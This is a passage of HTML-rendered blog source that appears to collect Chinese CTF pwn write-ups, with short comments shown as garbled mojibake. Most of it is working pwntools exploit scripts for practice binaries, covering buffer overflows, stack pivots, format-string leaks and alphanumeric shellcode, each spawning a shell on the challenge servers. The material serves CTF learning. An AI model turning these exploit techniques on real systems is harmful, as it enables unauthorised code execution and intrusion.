b&amp;#x27;%16$p&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(fmtpayload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;hello,0x&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;old_rbp = int(io.recv(12), 16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.success(&amp;#x27;RBP Addr: &amp;#x27; + (hex(old_rbp)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = 0x4007F2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x4008D3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = elf.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Target_Addr = old_rbp - 0x60 - 0x08&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# RDI will pop binsh addr as system&amp;#x27;s arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload = p64(rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08 + 0x08&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(Target_Addr + 0x8 + 0x18)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08 + 0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Offset : 0x08 + 0x18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Fill the Payload to 0x50.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload = Payload.ljust(0x50, b&amp;#x27;\x00&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# The Leave Ret cmd&amp;#x27;s ret addr.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(Target_Addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# The Leave Ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload += p64(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(Payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;keep on !\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(Payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2022-æ–°ç”Ÿèµ›shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2022-æ–°ç”Ÿèµ›shellcode&#34;&gt;#&lt;/a&gt; [SWPUCTF 2022 æ–°ç”Ÿèµ›] shellcodeï¼Ÿ&lt;/h5&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaGVsbGNyYWZ0LXNqMnA2NDNhanQ4Y3V0MmFxaTNhYnRlZTQ3Y2d3NGN2aWE3MmNuMjRlLnNo&#34;&gt;è¿˜ä¸èƒ½è¾“å…¥æ¯”è¾ƒé•¿çš„æˆ‘ç”¨ shellcraft.sh&lt;/span&gt; () ç”Ÿæˆä¸è¡Œ&lt;/p&gt;
&lt;h5 id=&#34;nustctf-2022-æ–°ç”Ÿèµ›ezpwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nustctf-2022-æ–°ç”Ÿèµ›ezpwn&#34;&gt;#&lt;/a&gt; [NUSTCTF 2022 æ–°ç”Ÿèµ›] ezPwn&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ä»€ä¹ˆåˆ¤æ–­ç›´æ¥ä¸ç®¡getsæº¢å‡ºåç›´æ¥è·³è½¬åˆ°systemåœ°å€å³å¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=cyclic(0x12)+p64(elf.sym[&amp;#x27;system&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hgame-2023-week1easy_overflow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hgame-2023-week1easy_overflow&#34;&gt;#&lt;/a&gt; [HGAME 2023 week1]easy_overflow&lt;/h5&gt;
&lt;p&gt;å¾ˆç®€å•çš„ä¸€ä¸ª ret2text ä½†æ˜¯æœ‰ä¸ªå‘ç‚¹å°±æ˜¯ close (1) è¿™ä¸ªç‚¹ä½ éœ€è¦è¿ä¸Šå»åä½¿ç”¨ exec 1&amp;gt;&amp;amp;0 æ¥æ‰“å¼€æ ‡å‡†è¾“å‡º&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28539)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x40101a)+p64(0x401176)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2022-åˆèµ›login_normal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2022-åˆèµ›login_normal&#34;&gt;#&lt;/a&gt; [CISCN 2022 åˆèµ›] login_normal&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜è€ƒç‚¹åœ¨äºä»£ç å®¡è®¡&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch=&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28823)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io=process(&amp;#x27;./login&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&amp;quot;=================&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;opt:1\nmsg:ro0tt\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode = shellcraft.sh()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode=b&amp;quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;opt:2\nmsg:&amp;#x27;+shellcode+b&amp;#x27;\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2022-æ–°ç”Ÿèµ›darling&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2022-æ–°ç”Ÿèµ›darling&#34;&gt;#&lt;/a&gt; [SWPUCTF 2022 æ–°ç”Ÿèµ›] Darling&lt;/h5&gt;
&lt;p&gt;éšæœºæ•° srand&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(0x1317E53)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl=libc.rand()%100-64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(str(sl))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;uuctf-2022-æ–°ç”Ÿèµ›babystack&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uuctf-2022-æ–°ç”Ÿèµ›babystack&#34;&gt;#&lt;/a&gt; [UUCTF 2022 æ–°ç”Ÿèµ›] babystack&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28003)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x108+p64(0x0400591)+p64(0x400726)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019ä¸œå—pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019ä¸œå—pwn2&#34;&gt;#&lt;/a&gt; [CISCN 2019 ä¸œå—] PWN2&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜å¾ˆä¸é”™é€‚åˆæ–°æ‰‹åƒ 32 ä½çš„æ ˆåç§»&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;i386&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret=0x080485FD  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset=0xffffcd58-0xffffcd20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28203)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# ç¬¬ä¸€æ¬¡æº¢å‡º1å­—èŠ‚è¦†ç›–\x00ï¼Œæ³„éœ²ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendafter(b&amp;#x27;name?\n&amp;#x27;,b&amp;#x27;a&amp;#x27;*(0x28-1)+b&amp;#x27;b&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;aaab&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_ebp=u32(io.recvuntil(b&amp;#x27;\xff&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;success(hex(leak_ebp)) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_addr=leak_ebp-offset-0x4 # -0x4æ˜¯å› ä¸ºç¬¬äºŒæ¬¡leave;retçš„æ—¶å€™ï¼Œpop espä¼šå¯¼è‡´+0x4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œropå†™åœ¨sä¸­ï¼Œæ ˆè¿ç§»åˆ°sï¼Œè°ƒç”¨systemï¼Œå‚æ•°ä¸ºè‡ªå·±å†™åœ¨æ ˆä¸Šçš„/bin/shï¼Œå‚æ•°åç§»è®¡ç®—å¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=p32(elf.plt[&amp;#x27;system&amp;#x27;])+p32(elf.sym[&amp;#x27;_start&amp;#x27;])+p32(leak_ebp-offset+0xc)+b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.ljust(0x28,b&amp;#x27;a&amp;#x27;)+p32(target_addr)+p32(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2023-åˆèµ›çƒ§çƒ¤æ‘Šå„¿&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2023-åˆèµ›çƒ§çƒ¤æ‘Šå„¿&#34;&gt;#&lt;/a&gt; [CISCN 2023 åˆèµ›] çƒ§çƒ¤æ‘Šå„¿&lt;/h5&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ª 64 ä½çš„ ret2syscall æ³¨æ„ execve è°ƒç”¨ä½ 64 æ˜¯ 59ï¼Œæˆ–è€…å¯ä»¥ç›´æ¥ä½¿ç”¨ ropgadget çš„ ropchain æ¥ç›´æ¥ç”Ÿæˆ payload é¦–å…ˆå®¡è®¡æºç åˆ©ç”¨è´Ÿæ•°è¾¾åˆ°é‡‘é¢ç„¶ååœ¨åˆ©ç”¨æ”¹åé‡Œé¢çš„æº¢å‡ºè¾¾åˆ° shellï¼Œæ³¨æ„è¿™ä¸ªæ˜¯é™æ€&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span 